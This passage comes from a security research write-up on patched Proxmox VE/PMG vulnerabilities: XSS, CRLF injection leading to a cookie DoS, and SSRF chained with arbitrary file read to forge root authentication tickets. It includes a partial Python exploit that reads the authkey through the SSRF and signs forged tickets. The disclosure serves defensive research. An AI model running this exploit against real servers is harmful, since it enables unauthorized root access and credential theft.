</code></pre><p>All set. To start a debug session, click <strong><code>Run &gt; Debug 'PVE remote'</code></strong> in IDEA and run <code>PERL5_DEBUG_HOST=&lt;your PVE server IP&gt; PERL5_DEBUG_PORT=12345 PERL5_DEBUG_ROLE=server perl -T -d:Camelcadedb /usr/bin/pveproxy start -debug</code> on the server. If everything goes well, the debugger should break at line 330 of <code>SSL.pm</code> by default, as shown in the image below.</p>
<p><img loading="lazy" src="/blog/2022/images/05.png" alt=""  />
</p>
<h2 id="bug-0x01-post-auth-xss-in-api-inspector">Bug 0x01: Post-auth XSS in API inspector<a hidden class="anchor" aria-hidden="true" href="#bug-0x01-post-auth-xss-in-api-inspector">#</a></h2>
<p>By logging in to the web interface, it can be observed that a lot of requests are sent to endpoints under the path <code>/api2/json/</code>. Usually, <code>json</code> after <code>/api</code> indicates the format the response data is in, and the server might support various formats for different purposes. For example, <code>xml</code> might be implemented for RPC calls, <code>jsonp</code> for cross-origin <code>&lt;script&gt;</code> tags, or <code>html</code> for setting <code>innerHTML</code>. In PVE, if we change <code>json</code> to <code>html</code>, the server will return an &ldquo;API Inspector&rdquo; page containing the json result:</p>
<p><img loading="lazy" src="/blog/2022/images/06.png" alt=""  />
</p>
<p>Further testing shows that the server does not properly escape user&rsquo;s input. If we visit a non-existent API endpoint, the request path will be reflected in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag. As such, an attacker can inject HTML tags to achieve reflected cross-site scripting.</p>
<p><img loading="lazy" src="/blog/2022/images/07.png" alt=""  />
</p>
<h3 id="further-analysis">Further Analysis<a hidden class="anchor" aria-hidden="true" href="#further-analysis">#</a></h3>
<p>The function <code>handle_request</code> at <code>perl5/PVE/APIServer/AnyEvent.pm</code> line 1100 is our entry point. If the request path starts with <code>/api2</code>, it will pass the request on to function <code>handle_api2_request</code>.</p>
<p><img loading="lazy" src="/blog/2022/images/08.png" alt=""  />
</p>
<p>Stepping into <code>handle_api2_request</code>, we can see at line 865 the variables <code>$rel_uri</code> and <code>$format</code> are extracted from the rest of the request path by a regex. Then function <code>PVE::APIServer::Formatter::get_formatter</code> is called to get a &ldquo;formatter&rdquo; for generating the response.
<img loading="lazy" src="/blog/2022/images/09.png" alt=""  />
</p>
<p>Later on, the <code>$formatter</code> is called at line 946. When generating the &ldquo;breadcrumb&rdquo; HTML of the navigation bar, the request path is directly concatenated to the <code>href</code> attribute of the <code>&lt;a&gt;</code> tag.</p>
<p><img loading="lazy" src="/blog/2022/images/10.png" alt=""  />
</p>
<p><img loading="lazy" src="/blog/2022/images/11.png" alt=""  />
</p>
<h3 id="impacts-attack-conditions--constraints">Impacts, attack conditions &amp; constraints<a hidden class="anchor" aria-hidden="true" href="#impacts-attack-conditions--constraints">#</a></h3>
<p>Since the authentication cookie <code>PVEAuthCookie</code> is set with the <code>Session</code> attribute, successful exploitation requires the victim to be logged in to the web interface in the same browser session before he visits the malicious link.</p>
<p>An attacker can access every functionality in the web interface by executing malicious JavaScript code. One of the features is to execute shell commands. Here is a video demonstrating a possible attack scenario. In the video, the victim logged in to PVE web UI, and then visited a link. A reverse shell of the PVE host was spawned on the attacker&rsquo;s machine.</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/ae-54FYt5t0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<h3 id="patch">Patch<a hidden class="anchor" aria-hidden="true" href="#patch">#</a></h3>
<p>This vulnerability is <a href="https://git.proxmox.com/?p=pve-http-server.git;a=commitdiff;h=00661f1223b7c0afffa64e1d91f5e018b985f762">patched</a> by encoding user inputs to HTML entities in <code>pve-http-server</code> version <code>4.1-2</code>.</p>
<h2 id="bug-0x02-crlf-injection-in-response-headers">Bug 0x02: CRLF injection in response headers<a hidden class="anchor" aria-hidden="true" href="#bug-0x02-crlf-injection-in-response-headers">#</a></h2>
<p>While handling HTTP requests, if there is any error, the PVE server will write the error message in the status line of the response.</p>
<p><img loading="lazy" src="/blog/2022/images/12.png" alt=""  />
</p>
<p>The corresponding code is located in <code>perl5/PVE/APIServer/AnyEvent.pm</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="c1"># line 294</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$resp</span><span class="o">-&gt;</span><span class="n">code</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$msg</span> <span class="o">=</span> <span class="nv">$resp</span><span class="o">-&gt;</span><span class="n">message</span> <span class="o">||</span> <span class="nn">HTTP::Status::</span><span class="n">status_message</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$msg</span> <span class="o">=~</span><span class="sr">m/^(.*)$/m</span><span class="p">;</span>   <span class="c1"># [1]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ...</span>
</span></span><span class="line"><span class="cl"><span class="c1"># line 308</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$proto</span> <span class="o">=</span> <span class="nv">$reqstate</span><span class="o">-&gt;</span><span class="p">{</span><span class="n">proto</span><span class="p">}</span> <span class="p">?</span> <span class="nv">$reqstate</span><span class="o">-&gt;</span><span class="p">{</span><span class="n">proto</span><span class="p">}</span><span class="o">-&gt;</span><span class="p">{</span><span class="n">str</span><span class="p">}</span> <span class="p">:</span> <span class="s">&#39;HTTP/1.0&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$res</span> <span class="o">=</span> <span class="s">&#34;$proto $code $msg\015\012&#34;</span><span class="p">;</span>   <span class="c1"># [2]</span>
</span></span></code></pre></div><p>At <code>[1]</code> the server uses a regex to match the first line of the error message, trying to avoid additional lines breaking the HTTP response at <code>[2]</code>. However, this method only prevents LF(%0a). It’s still possible to inject response headers with CR(%0d) in Chromium-based browsers.</p>
<p><img loading="lazy" src="/blog/2022/images/13.png" alt=""  />
</p>
<p>This is what the response looks like in Burp Suite:</p>
<p><img loading="lazy" src="/blog/2022/images/14.png" alt=""  />
</p>
<h3 id="impacts-attack-conditions--constraints-1">Impacts, attack conditions &amp; constraints<a hidden class="anchor" aria-hidden="true" href="#impacts-attack-conditions--constraints-1">#</a></h3>
<p>At the time of testing, using CR(%0d) to inject response headers only works on Chromium-based browsers (Chrome, MS Edge, Opera, etc.), and it is not possible to inject into the response body using only CR(%0d). Firefox does not recognise CR(%0d) as a valid newline indicator without LF(%0a).</p>
<p>This bug in PVE might seem completely harmless at first sight. Unfortunately, at <code>AnyEvent.pm</code> line 1327, there is a length limit check for incoming HTTP requests. If a request header exceeds 8192 bytes, the server will reject to process the HTTP request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="c1"># line 55</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$limit_max_header_size</span> <span class="o">=</span> <span class="mi">8</span><span class="o">*</span><span class="mi">1024</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ...</span>
</span></span><span class="line"><span class="cl"><span class="c1"># line 1327</span>
</span></span><span class="line"><span class="cl"><span class="nb">die</span> <span class="s">&#34;http header too large\n&#34;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$state</span><span class="o">-&gt;</span><span class="p">{</span><span class="n">size</span><span class="p">}</span> <span class="o">+=</span> <span class="nb">length</span><span class="p">(</span><span class="nv">$line</span><span class="p">))</span> <span class="o">&gt;=</span> <span class="nv">$limit_max_header_size</span><span class="p">;</span>
</span></span></code></pre></div><p>As such, an attacker could craft a malicious webpage to set long cookies on the victim&rsquo;s PVE domain multiple times. Once the victim visits the malicious webpage, subsequent HTTP requests to the PVE domain will carry a very long cookie header and thus be rejected by the server.</p>
<p>Here is a video to demonstrate this client-side DoS vulnerability. In the video, the victim was able to use PVE web UI at first. After visiting a malicious link, the victim can no longer access the web UI until he clears the cookies.</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/i-9_3JpP_Cw" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<p>One thing to note is that Chrome allows third-party cookies by default. This is a necessary condition to exploit this client-side DoS bug since we are setting cookies from the attacker&rsquo;s domain to the victim&rsquo;s PVE domain. However, if the victim has changed their cookie policy to &ldquo;Block third-party cookies&rdquo; or &ldquo;Block all cookies (not recommended)&rdquo; in browser settings, this attack will not work.</p>
<h3 id="patch-1">Patch<a hidden class="anchor" aria-hidden="true" href="#patch-1">#</a></h3>
<p>This bug is <a href="https://git.proxmox.com/?p=pve-http-server.git;a=commitdiff;h=936007ae0241811093155000486da171379c23c2">patched</a> by adding an additional check of <code>\r\n</code> in <code>pve-http-server</code> version <code>4.1-3</code>.</p>
<h2 id="bug-0x03-post-auth-ssrf--lfi--privilege-escalation">Bug 0x03: Post-auth SSRF + LFI + Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#bug-0x03-post-auth-ssrf--lfi--privilege-escalation">#</a></h2>
<h3 id="ssrf">SSRF<a hidden class="anchor" aria-hidden="true" href="#ssrf">#</a></h3>
<p>A PVE server can run as a standalone node or join a cluster to connect with other nodes. This design naturally allows nodes to exchange information with each other. For instance, the api <code>/api2/json/nodes/{node_name}/status</code> is meant for querying the status of a node in the cluster by its name. It can also be used to query on the node itself.</p>
<p><img loading="lazy" src="/blog/2022/images/16.png" alt=""  />
</p>
<p>If we change the <code>node_name</code> to a nonexistent value &ldquo;test&rdquo;, we will see this error message: <code>HTTP/1.1 500 hostname lookup 'test' failed - failed to get address info for: test: No address associated with hostname</code>. It seems that the server is trying to perform a DNS lookup on the given <code>node_name</code>. A quick test using Burp Collaborator verifies our guess:</p>
<p><img loading="lazy" src="/blog/2022/images/17.png" alt=""  />
</p>
<p>By step debugging, we are able to locate the corresponding code in <code>AnyEvent.pm:proxy_request</code>. It turns out that the server resolves <code>node_name</code> to IP address and then relays our HTTP request to <code>https://{IP}:8006/api2/json/nodes/{node_name}/status</code>.</p>
<p><img loading="lazy" src="/blog/2022/images/18.png" alt=""  />
</p>
<p>One thing we might want to try here is to setup our own HTTPS server to listen on port 8006 with a valid SSL certificate and observe whether the relayed request could come in. While it does not work like that because there are multiple checks performed before firing the request and one of them is expecting <code>/etc/pve/nodes/{node_name}/pve-ssl.pem</code> to be found for every node in the cluster. Whether we input our own domain name or IP address, the server will never find the cert file since the <code>node_name</code> does not point to any real node in the cluster. So it just throws the error &ldquo;HTTP/1.1 596 tls_process_server_certificate: certificate verify failed&rdquo; during TLS handshake and stops there.</p>
<p>Another thing we notice is that <code>$uri</code> is appended to the port (line 699, 703 and 705 in the image above) when constructing the <code>$target</code> URL. The developers might have assumed that <code>$uri</code> will always start with a slash(/). While that is not true as we find out that it is possible to replace slash(/) with its URL-encoded form <code>%2F</code> without breaking the request parser.</p>
<p><img loading="lazy" src="/blog/2022/images/19.png" alt=""  />
</p>
<p>We tried to turn the starting part of the URL into userinfo and append our own domain by using the at sign (@), but one of the sanity checks blocked us again. After several attempts, we managed to find a suitable API to exploit this SSRF vulnerability: <code>GET /api2/json/nodes/{node_name}/tasks/{upid}/log</code>. This API accepts any string as <code>upid</code>, which means we can set <code>node_name</code> to a valid node so that it won&rsquo;t fail for certificate issues. Then we use URL-encoded slashes and <code>@</code> to control the hostname.</p>
<p><img loading="lazy" src="/blog/2022/images/20.png" alt=""  />
</p>
<p><img loading="lazy" src="/blog/2022/images/21.png" alt=""  />
</p>
<p>An authenticated user without any permissions in PVE is able to perform this SSRF attack. Due to the large shared codebases between PVE and PMG, an authenticated user in PMG that only has a low privilege &ldquo;Help Desk&rdquo; role or &ldquo;Audit&rdquo; role can also exploit this SSRF vulnerability using API <code>/api2/html/nodes/{node_name}/pbs/{remote}/snapshot/</code>.</p>
<h3 id="arbitrary-file-read">Arbitrary file read<a hidden class="anchor" aria-hidden="true" href="#arbitrary-file-read">#</a></h3>
<p>Inside the callback function of <code>http_request</code>, the server looks for the <code>pvestreamfile</code> header in response headers (line 778) and extracts its value to the variable <code>$stream</code>. <code>$stream</code> is later passed to <code>sysopen</code>, and the server will return the content of the file as the response body.</p>
<p><img loading="lazy" src="/blog/2022/images/22.png" alt=""  />
</p>
<p>The vulnerable code exists in PMG as well. An attacker can exploit the SSRF vulnerability presented earlier to read arbitrary files on PVE/PMG servers with only a non-privileged account in PVE or a low-privilege account in PMG. The <code>sysopen</code> is called in process &ldquo;pve(pmg)proxy worker&rdquo; with uid=33(www-data).</p>
<p><img loading="lazy" src="/blog/2022/images/23.png" alt=""  />
</p>
<h3 id="privilege-escalation-in-pmg-via-unsecured-backup-file">Privilege escalation in PMG via unsecured backup file<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation-in-pmg-via-unsecured-backup-file">#</a></h3>
<p>With the ability to read an arbitrary file, hackers might be particularly interested in credentials and secret keys stored on the server. We decided to dig into the implementation of the authentication process to see whether the server stores anything in the database or in the config file, in plaintext or encrypted by some &ldquo;secret keys&rdquo;.</p>
<p>Authentication in PVE/PMG is implemented by signing and verifying a string using RSA/SHA-1. Upon successful login, the server will sign a &ldquo;ticket&rdquo; for client, as known as &ldquo;PVEAuthCookie&rdquo; or &ldquo;PMGAuthCookie&rdquo;. Here is a sample of the ticket:</p>
<pre tabindex="0"><code>PVE:user01@pve:62BD5976::L1CM303sdb4Lr8yFOxFbw7KNYQ2SKI6LugQJj0+JDBpTG3L2QBBMQTe8Q2/VgECWumE8OyjB1ff15GIMLnHAnOTdGeRUbntaMQhU5kHr6TZsAbRRzZ6MTBqkFTq0lJUcK86BcNpHUaciABVEEjVvgDnOOToJXSMvM/qxzmiusTrx5wpturrF1D8hmhay2sG9eEuKwXVsIb6aeBL0Vcwm7V8VUQ0qqnUyaArAaJ4eW1MLIXgHl23OySYEl3CMg5mdbHyn+B0ITz8N4mYWXA2BedVxwE1Uo6NltJDsd63Mgob7ey9xmZSQI2M9qrLZIIhPbfK6panXJBvuCqAILZKjmw==
</code></pre><p>The double colon seperates the plaintext and signature. The format of plaintext is <code>PVE:{username}@{realm}:{hex(timestamp)}</code> . While the signature is generated using private key stored at <code>/etc/pve/priv/authkey.key</code> for PVE, or <code>/etc/pmg/pmg-authkey.key</code> for PMG, only root user has read-write permissions to these files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pve7:~# ls -l /etc/pve/priv/authkey.key
</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root www-data <span class="m">1675</span> Jun <span class="m">30</span> 10:52 /etc/pve/priv/authkey.key
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root@pmg:~# ls -l /etc/pmg/pmg-authkey.key
</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root <span class="m">1679</span> Jun  <span class="m">9</span> 11:43 /etc/pmg/pmg-authkey.key
</span></span></code></pre></div><p>However, it turns out that if the backup feature in PMG has ever been used, the backup file will contain the authkey. More importantly, it is readable by www-data users:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pmg:/var/lib/pmg/backup# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">12</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">10799</span> Jun  <span class="m">9</span> 17:16 pmg-backup_2022_06_09_62A1BA65.tgz
</span></span></code></pre></div><p>The path to the backup file can be extracted from task logs which is also accessible by www-data user. Combining all the vulnerabilities above, an attacker can forge a ticket to achieve privilege escalation from a low privilege &ldquo;Help Desk&rdquo; role or &ldquo;Audit&rdquo; role to <code>&quot;root@pam&quot;</code> for full access in PMG.</p>
<h4 id="proof-of-concept">Proof-of-concept<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h4>
<p>We have attached the python script below and a video demonstrating this exploit. In the video, the attacker logged in to PMG web UI as a &ldquo;Help Desk&rdquo; user and was not able to change the current user&rsquo;s role due to low privilege. After running the exploit, a forged ticket was generated, and the attacker gained access to the web UI as <code>&quot;root@pam&quot;</code> user.</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/6mKYnRa6Hi4" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">logging</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ssl</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tarfile</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tempfile</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PROXIES</span> <span class="o">=</span> <span class="p">{}</span>  <span class="c1"># {&#39;https&#39;: &#39;192.168.86.52:8080&#39;}</span>
</span></span><span class="line"><span class="cl"><span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="nb">format</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">%(asctime)s</span><span class="s1"> - </span><span class="si">%(message)s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_ticket</span><span class="p">(</span><span class="n">authkey_bytes</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;root@pam&#39;</span><span class="p">,</span> <span class="n">time_offset</span><span class="o">=-</span><span class="mi">30</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">+</span> <span class="n">time_offset</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;PMG:</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">authkey_path</span> <span class="o">=</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">NamedTemporaryFile</span><span class="p">(</span><span class="n">delete</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;writing authkey to </span><span class="si">{</span><span class="n">authkey_path</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">authkey_path</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">authkey_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">authkey_path</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">txt_path</span> <span class="o">=</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">NamedTemporaryFile</span><span class="p">(</span><span class="n">delete</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;writing plaintext to </span><span class="si">{</span><span class="n">txt_path</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">txt_path</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">plaintext</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">txt_path</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;calling openssl to sign&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sig</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="s1">&#39;openssl&#39;</span><span class="p">,</span> <span class="s1">&#39;dgst&#39;</span><span class="p">,</span> <span class="s1">&#39;-sha1&#39;</span><span class="p">,</span> <span class="s1">&#39;-sign&#39;</span><span class="p">,</span> <span class="n">authkey_path</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> <span class="s1">&#39;-out&#39;</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="n">txt_path</span><span class="o">.</span><span class="n">name</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">sig</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">sig</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;latin-1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">plaintext</span><span class="si">}</span><span class="s1">::</span><span class="si">{</span><span class="n">sig</span><span class="si">}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;generated ticket for </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s1">: </span><span class="si">{</span><span class="n">ret</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">ticket</span><span class="p">,</span> <span class="n">localhostname</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;reading </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">raw_req</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;GET %2Fapi2%2Fhtml%2Fnodes%2F</span><span class="si">{</span><span class="n">localhostname</span><span class="si">}</span><span class="s1">%2Fpbs%<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f8cabeb88ccfd69b9994c9d69b96">[email&#160;protected]</a>/snapshot/?f=</span><span class="si">{</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span><span class="si">}</span><span class="s1"> HTTP/1.1</span><span class="se">\r\n</span><span class="s1">&#39;</span> \
</span></span><span class="line"><span class="cl">              <span class="sa">f</span><span class="s1">&#39;Cookie: PMGAuthCookie=</span><span class="si">{</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">ticket</span><span class="p">)</span><span class="si">}</span><span class="se">\r\n</span><span class="s1">&#39;</span> \
</span></span><span class="line"><span class="cl">              <span class="s1">&#39;Connection: close</span><span class="se">\r\n</span><span class="s1">&#39;</span> \
</span></span><span class="line"><span class="cl">              <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">raw_req</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">create_default_context</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># disable cert check</span>
</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">check_hostname</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">verify_mode</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">VerifyMode</span><span class="o">.</span><span class="n">CERT_NONE</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">server_hostname</span><span class="o">=</span><span class="n">hostname</span><span class="p">)</span> <span class="k">as</span> <span class="n">ssock</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">ssock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">raw_req</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">buf</span> <span class="o">=</span> <span class="n">ssock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">ret</span> <span class="o">+=</span> <span class="n">buf</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span>
</span></span><span class="line"><span class="cl">                    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;recv </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s1"> bytes&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">logging</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s1">&#39;recv timeout, maybe the file doesn</span><span class="se">\&#39;</span><span class="s1">t exist&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_authkey_from_tgz</span><span class="p">(</span><span class="n">tgz_bytes</span><span class="p">):</span>
